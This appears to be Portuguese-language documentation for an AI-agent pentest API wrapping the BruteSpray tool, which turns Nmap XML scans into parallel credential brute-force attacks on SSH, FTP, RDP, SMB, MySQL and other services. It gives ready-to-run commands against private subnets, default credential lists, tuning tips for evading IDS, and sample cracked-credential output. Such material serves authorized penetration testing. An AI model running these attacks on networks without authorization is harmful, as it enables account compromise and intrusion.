---
name: "brutespray"
description: "Ferramenta de orquestracao automatica de brute force que consome a saida XML do Nmap e lanca ataques de credenciais contra todos os servicos descobertos. Usa Medusa como backend. Elimina a etapa manual de mapear servicos para ferramentas de brute force, automatizando o pipeline reconhecimento->ataque. Use apos um scan Nmap (-oX) para testar credenciais em todos os servicos abertos descobertos."
---

# brutespray

## Objetivo

O BruteSpray automatiza o pipeline reconhecimento -> brute force. Ele le o arquivo XML gerado pelo Nmap (-oX) e lanca automaticamente ataques de dicionario em cada servico de autenticacao descoberto, usando o Medusa como motor de brute force. Isso elimina a necessidade de configurar manualmente cada servico descoberto em ferramentas como Hydra ou Ncrack. Casos de uso principais:

- Automacao completa do brute force pos-scan: Nmap descobre, BruteSpray ataca
- Ataques simultanios contra multiplos servicos e multiplos hosts em paralelo
- Filtragem por servico especifico para focar o ataque (--service ssh,ftp)
- Exibir apenas credenciais bem-sucedidas (--found-only)
- Integracao natural em pipelines de pentest automatizado
- Suporte a servicos: SSH, FTP, Telnet, VNC, MSSQL, MySQL, PostgreSQL, HTTP, HTTPS, SMB, RDP, SMTP, IMAP, POP3

## Endpoint

```
POST /api/bruteforce/brutespray
```

## Requer target

Nao diretamente. O target e definido pelo arquivo XML do Nmap passado via --file. O campo `target` pode ser usado para documentar o escopo, mas os hosts atacados sao os presentes no XML.

## Parametros

| Parametro | Tipo   | Obrigatorio | Descricao                                                                       |
|-----------|--------|-------------|---------------------------------------------------------------------------------|
| target    | string | Nao         | Documentacao do escopo. Os hosts reais vem do arquivo Nmap XML                  |
| options   | string | Sim         | Flags do CLI incluindo --file obrigatorio e demais opcoes de configuracao       |

## Flags Importantes

| Flag                  | Descricao                                                                          |
|-----------------------|------------------------------------------------------------------------------------|
| --file nmap.xml       | Arquivo XML gerado pelo Nmap com -oX (OBRIGATORIO)                                 |
| --service ssh,ftp     | Filtra ataque para servicos especificos (virgula sem espaco para multiplos)        |
| --threads N           | Numero de threads por servico (padrao: 1)                                          |
| --hosts-per-service N | Numero de hosts atacados simultaneamente por servico (padrao: 1)                   |
| -U userlist           | Wordlist de usuarios customizada                                                   |
| -P passlist           | Wordlist de senhas customizada                                                     |
| --found-only          | Exibe e salva apenas credenciais bem-sucedidas (suprime tentativas falhas)         |
| -o output-dir         | Diretorio para salvar arquivos de resultado (um por servico)                       |
| --no-bruteforce       | Apenas analisa o XML e lista servicos sem executar brute force (dry-run)           |
| --verbose             | Exibe mais informacoes sobre o progresso do ataque                                 |

### Wordlists Internas Padrao

O BruteSpray possui wordlists internas para cada servico quando -U e -P nao sao especificados:

| Servico    | Usuarios padrao testados                           | Senhas padrao testadas                    |
|------------|-----------------------------------------------------|-------------------------------------------|
| SSH        | root, admin, user, ubuntu, pi, vagrant              | root, admin, password, 123456, toor       |
| FTP        | anonymous, ftp, admin, root                         | anonymous, ftp, password, (vazio)         |
| MySQL      | root, admin, mysql                                  | root, password, mysql, (vazio)            |
| MSSQL      | sa, admin                                           | sa, password, admin, (vazio)              |
| RDP        | administrator, admin, user                          | password, 123456, administrator           |
| SMB        | administrator, admin, guest, user                   | password, 123456, (vazio)                 |

### Fluxo de Trabalho Tipico

```
1. Scan Nmap com saida XML:
   nmap -sV -p 21,22,23,25,80,110,143,443,445,1433,3306,3389,5432 -oX /tmp/scan.xml 192.168.1.0/24

2. BruteSpray consume o XML e ataca automaticamente:
   brutespray --file /tmp/scan.xml --threads 5 --hosts-per-service 5 --found-only -o /tmp/bs_results/
```

## Exemplos

### Caso 1 - Ataque automatico completo a partir de scan Nmap

```json
{
  "target": "192.168.1.0/24",
  "options": "--file /tmp/scan.xml --threads 5 --hosts-per-service 3 --found-only -o /tmp/results/"
}
```

Comando CLI equivalente:
```
brutespray --file /tmp/scan.xml --threads 5 --hosts-per-service 3 --found-only -o /tmp/results/
```

O BruteSpray ira ler o XML, identificar todos os servicos de autenticacao e lancar brute force
em paralelo, salvando apenas as credenciais bem-sucedidas.

### Caso 2 - Ataque focado apenas em SSH e FTP com wordlists customizadas

```json
{
  "target": "192.168.1.0/24",
  "options": "--file /tmp/scan.xml --service ssh,ftp -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt --threads 3 --found-only -o /tmp/ssh_ftp_results/"
}
```

Comando CLI equivalente:
```
brutespray --file /tmp/scan.xml --service ssh,ftp -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt --threads 3 --found-only -o /tmp/ssh_ftp_results/
```

Use --service para restringir o ataque a servicos especificos quando o escopo e limitado ou
quando voce quer priorizar servicos de maior impacto.

### Caso 3 - Dry-run para listar servicos descobertos sem atacar

```json
{
  "target": "192.168.1.0/24",
  "options": "--file /tmp/scan.xml --no-bruteforce --verbose"
}
```

Comando CLI equivalente:
```
brutespray --file /tmp/scan.xml --no-bruteforce --verbose
```

Use --no-bruteforce para inspecionar quais servicos e hosts serao atacados antes de executar.
Util para validar escopo e planejar a execucao real.

### Caso 4 - Ataque a bancos de dados descobertos com alta paralelizacao

```json
{
  "target": "10.0.0.0/24",
  "options": "--file /tmp/db_scan.xml --service mysql,mssql,psql --threads 5 --hosts-per-service 5 -U /tmp/db_users.txt -P /tmp/db_pass.txt --found-only -o /tmp/db_results/"
}
```

Comando CLI equivalente:
```
brutespray --file /tmp/db_scan.xml --service mysql,mssql,psql --threads 5 --hosts-per-service 5 -U /tmp/db_users.txt -P /tmp/db_pass.txt --found-only -o /tmp/db_results/
```

Para databases, recomenda-se incluir na wordlist de usuarios: root, sa, admin, mysql, postgres, oracle.
E na de senhas: (vazio), root, password, 123456, admin, sa, postgres.

### Caso 5 - Pipeline completo: Nmap scan + BruteSpray automatico

Primeiro execute o scan Nmap com deteccao de versao e saida XML:
```
nmap -sV -p 21,22,23,25,80,110,143,443,445,1433,3306,3389,5432 -T4 -oX /tmp/full_scan.xml 10.10.10.0/24
```

Em seguida, lance o BruteSpray no XML gerado:
```json
{
  "target": "10.10.10.0/24",
  "options": "--file /tmp/full_scan.xml --threads 4 --hosts-per-service 4 --found-only -o /tmp/brutespray_out/"
}
```

O resultado por servico e salvo em /tmp/brutespray_out/ como arquivos separados:
  - brutespray_ssh_success.txt
  - brutespray_ftp_success.txt
  - brutespray_rdp_success.txt

## OPSEC

- **Paralelismo agressivo**: Os parametros --threads e --hosts-per-service se multiplicam. Com --threads 5 e --hosts-per-service 5, sao 25 ataques simultaneos. Em redes com IDS isso e extremamente visivel. Comece com --threads 2 --hosts-per-service 1.
- **Wordlists internas sao limitadas**: As wordlists padrao do BruteSpray sao curtas. Para ambientes reais, sempre forneca -U e -P com wordlists completas (SecLists, rockyou).
- **Depende do Nmap -oX**: O arquivo XML deve ser gerado com -sV (deteccao de versao) para que o BruteSpray identifique corretamente os servicos. Sem -sV, o mapeamento de servico pode falhar.
- **Lockout em cascata**: Por atacar multiplos servicos simultaneamente, o risco de lockout de conta AD e maior. Use --hosts-per-service 1 e --threads 1 em ambientes Windows corporativos.
- **--found-only e essencial em producao**: Sem essa flag, o output inclui todas as tentativas e pode gerar gigabytes de log. Sempre use --found-only para manter o output gerenciavel.
- **Proteja o arquivo XML do Nmap**: O XML contem mapa completo da rede alvo. Armazene em local seguro e delete apos o uso.
- **Teste de FTP anonymous**: O BruteSpray testa FTP anonimo automaticamente quando FTP e incluido. Muitos servidores FTP legados aceitam login anonimo, facilitando o acesso inicial.
- **Servicos web (HTTP)**: O brute force HTTP via BruteSpray usa autenticacao HTTP Basic. Para formularios de login customizados, use Hydra com http-post-form.

## Saida

A API retorna um objeto JSON com os seguintes campos:

| Campo     | Tipo    | Descricao                                                                  |
|-----------|---------|----------------------------------------------------------------------------|
| success   | boolean | true se a execucao ocorreu sem erros fatais                                |
| stdout    | string  | Saida padrao do BruteSpray com progresso e credenciais encontradas         |
| stderr    | string  | Erros e avisos emitidos pela ferramenta ou pelo Medusa (backend)           |
| report    | string  | Resumo estruturado da API com credenciais extraidas por servico             |
| artifacts | array   | Lista de arquivos gerados no diretorio -o (um por servico atacado)         |

Exemplo de stdout com credenciais encontradas:
```
[*] Attacking SSH on 192.168.1.10 with 5 threads
[+] ACCOUNT FOUND: [ssh] Host: 192.168.1.10 User: root Password: toor [SUCCESS]
[*] Attacking FTP on 192.168.1.20 with 5 threads
[+] ACCOUNT FOUND: [ftp] Host: 192.168.1.20 User: anonymous Password:  [SUCCESS]
```
